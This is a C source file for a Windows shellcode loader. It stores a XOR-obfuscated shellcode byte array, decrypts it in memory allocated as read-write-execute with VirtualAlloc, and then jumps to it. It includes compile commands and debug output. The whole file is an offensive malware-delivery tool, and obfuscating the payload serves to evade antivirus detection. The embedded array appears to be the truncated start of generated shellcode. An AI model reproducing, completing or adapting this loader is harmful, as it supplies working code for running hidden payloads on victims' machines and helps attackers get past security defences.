// Compile ->
// cl loader.c /Fe:loader.exe /O2 /MT user32.lib
// cl loader.c
#include <windows.h>
#include <stdio.h>

/* ====== XORed Shellcode goes here ====== */
unsigned char xored_shellcode[] = {
    0xbd, 0x09, 0xc0, 0xa5, 0xb1, 0xbe, 0xbe, 0xbe, 0xa9, 0x8d, 0x41, 0x41, 0x41, 0x00, 0x10, 0x00,
    0x11, 0x13, 0x09, 0x70, 0x93, 0x24, 0x09, 0xca, 0x13, 0x21, 0x09, 0xca, 0x13, 0x59, 0x10, 0x09,
    0xca, 0x13, 0x61, 0x17, 0x0c, 0x70, 0x88, 0x09, 0xca, 0x33, 0x11, 0x09, 0x4e, 0xf6, 0x0b, 0x0b,
    0x09, 0x70, 0x81, 0xed, 0x7d, 0x20, 0x3d
};


/* ====== XORed Shellcode above ====== */
unsigned int xored_shellcode_len = sizeof(xored_shellcode);

/* Byte key: */
unsigned char xor_key[] = { 0x41 };
unsigned int xor_key_len = 1;

/* String key: */
// unsigned char xor_key[] = "google";
// unsigned int xor_key_len = sizeof(xor_key) - 1;

/* ====== LE XOR ====== */
void xor_decrypt(unsigned char* data, unsigned int len,
                 unsigned char* key, unsigned int key_len)
{
    for (unsigned int i = 0; i < len; i++)
        data[i] ^= key[i % key_len];
}

/* ====== Dump bytes [+] Debug ====== */
void dump_bytes(const unsigned char* buf, unsigned int len)
{
    unsigned int dump_len = len < 16 ? len : 16;

    for (unsigned int i = 0; i < dump_len; i++)
        printf("%02X ", buf[i]);

    printf("\n");
}

int main(void)
{
    printf("[+] Loader started\n");

    /* 1 Allocate memory */
    LPVOID exec_mem = VirtualAlloc(
        NULL,
        xored_shellcode_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!exec_mem)
    {
        printf("[-] VirtualAlloc failed (err=%lu)\n", GetLastError());
        return 1;
    }

    printf("[+] VirtualAlloc OK @ %p\n", exec_mem);

    /* 2 Copy XORed shellcode */
    memcpy(exec_mem, xored_shellcode, xored_shellcode_len);
    printf("[+] Shellcode copied (%u bytes)\n", xored_shellcode_len);

    /* 3 Bytes before */
    printf("[+] Shellcode bytes BEFORE XOR: ");
    dump_bytes((unsigned char*)exec_mem, xored_shellcode_len);

    /* 4 Decrypt in memory */
    xor_decrypt(
        (unsigned char*)exec_mem,
        xored_shellcode_len,
        xor_key,
        xor_key_len
    );

    printf("[+] XOR decryption done\n");

    /* 5 Bytes after decrypt [+] Debug */
    printf("[+] Shellcode bytes AFTER  XOR: ");
    dump_bytes((unsigned char*)exec_mem, xored_shellcode_len);

    /* 6 Execute shellcode */
    printf("[+] Executing shellcode...\n");

    void (*shellcode)() = (void (*)())exec_mem;
    shellcode();

    /* Everything works ye? */
    printf("[+] Shellcode returned cleanly\n");

    return 0;
}
